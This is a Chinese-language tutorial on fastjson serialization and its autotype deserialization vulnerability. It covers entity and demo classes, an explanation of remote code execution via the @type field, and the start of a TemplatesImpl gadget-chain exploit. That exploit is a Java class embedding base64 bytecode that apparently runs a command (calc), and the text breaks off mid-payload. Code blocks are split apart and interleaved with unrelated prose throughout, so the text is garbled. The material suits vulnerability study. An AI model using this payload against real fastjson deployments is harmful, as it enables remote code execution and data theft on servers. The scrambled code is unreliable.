S-fastjson
fastjson的使用
实体类
package fastjson.example.use;
import java.util.Map;
public class User {
    private String name;
    private int age;
    private Map hashMap;
    @Override
    public String toString() {
        return "User{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", hashMap=" + hashMap +
                '}';
    }
    public User(String name, int age, Map hashMap) {
        this.name = name;
        this.age = age;
        this.hashMap = hashMap;
    }
    public User() {
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public int getAge() {
        return age;
    }
    public void setAge(int age) {
        this.age = age;
    }
    public Map getHashMap() {
        return hashMap;
    }
    public void setHashMap(Map hashMap) {
序列化
在调用 toJSONString 方法的时候，参数里面多了一个 SerializerFeature.WriteClassName 方
法。传入 SerializerFeature.WriteClassName 可以使得 Fastjson 支持自省，开启自省后序列
化成 JSON 的数据就会多一个 @type ，这个是代表对象类型的 JSON 文本。 FastJson 的漏洞就是
他的这一个功能去产生的，在对该 JSON 数据进行反序列化的时候，会去调用指定类中对于的
get/set/is 方法， 后面会详细分析。
反序列化
        this.hashMap = hashMap;
    }
}
package fastjson.example.use;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;
import java.util.HashMap;
public class serialize {
    public static void main(String[] args) {
        String name="zhangsan";
        int age=20;
        HashMap hashMap = new HashMap();
        User user = new User(name, age, hashMap);
        String s = JSON.toJSONString(user);
        System.out.println(s);
        System.out.println("==================================");
        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
    }
}
/*
{"age":20,"hashMap":{},"name":"zhangsan"}
==================================
{"@type":"fastjson.example.use.User","age":20,"hashMap":
{"@type":"java.util.HashMap"},"name":"zhangsan"}
*/
package fastjson.example.use;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;
import java.util.HashMap;
public class unserialize {
    public static void main(String[] args) {
        String name="lisi";
        int age=21;
        HashMap hashMap = new HashMap();
        User user = new User();
这三段代码中，可以发现用了 JSON.parseObject 和 JSON.parse 这两个方
法, JSON.parseObject 方法中没指定对象，返回的则是 JSONObject 的对象。
JSON.parseObject 和 JSON.parse 这两个方法差不多， JSON.parseObject 的底层调用的还是
JSON.parse 方法，只是在 JSON.parse 的基础上做了一个封装。在序列化时， FastJson 会调用
成员对应的 get 方法，被 private 修饰且没有 get 方法的成员不会被序列化，而反序列化的时候
在，会调用了指定类的全部的 setter ， publibc 修饰的成员全部赋值。其中有意思的是这个
@type ，在反序列化的过程中会自动创建对象，并且调用 setter 方法进行赋值。
反序列化漏洞
说明
        user.setAge(age);
        user.setName(name);
        user.setHashMap(hashMap);
        System.out.println("==============================================");
        String s = JSON.toJSONString(user);
        User user1 = JSON.parseObject(s, User.class);
        System.out.println(user1);
        System.out.println("==============================================");
        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        JSONObject jsonObject = JSON.parseObject(s1);
        System.out.println(jsonObject);
        System.out.println(jsonObject.getClass().getName());
        System.out.println("==============================================");
        String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        Object user2 = JSON.parseObject(s2, Object.class);
        System.out.println(user2);
        System.out.println(user2.getClass().getName());
        System.out.println("==============================================");
        String s3="
{\"@type\":\"fastjson.example.use.User\",\"age\":25,\"hashMap\":
{\"@type\":\"java.util.HashMap\"},\"name\":\"zhangsan\"}";
        Object o = JSON.parseObject(s3, Object.class);
        if(o instanceof User){
            User user3=(User) o;
            int age1 = user3.getAge();
            System.out.println(age1);
        }
    }
}
/*
==============================================
User{name='lisi', age=21, hashMap={}}
==============================================
{"name":"lisi","hashMap":{},"age":21}
com.alibaba.fastjson.JSONObject
==============================================
User{name='lisi', age=21, hashMap={}}
fastjson.example.use.User
==============================================
25
*/
漏洞是利用 fastjson autotype 在处理 json 对象的时候，未对 @type 字段进行完全的安全性验
证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。攻
击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用
此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。
TemplatesImpl 构造链
漏洞调试
这里是用最经典的 TemplatesImpl 来弹出计算机，这里调试只写出几个有疑问的地方，具体的反
序列化过程其实并不是很复杂。参考的部分文章：Fastjson TemplatesImpl 利用链      Fastjson反
序列化之TemplatesImpl调用链，在这个构造链当中因为几个重要的参数都是 private ，所以需
要开启 Feature.SupportNonPublicField ，否则反序列化会失败。
package fastjson.example.bug;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
public class payload_ {
    public static void main(String[] args) {
        ParserConfig parserConfig = new ParserConfig();
        String text = "
{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_bytecodes\":
[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ
29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZ
XN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhb
i9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUT
UF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nlc
mlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL
2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2lud
GVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUve
G1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZ
y9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pb
nRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvb
S9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlc
jsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9Td
HJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAM
gAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1b
nRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hc
GFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZ
XB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpb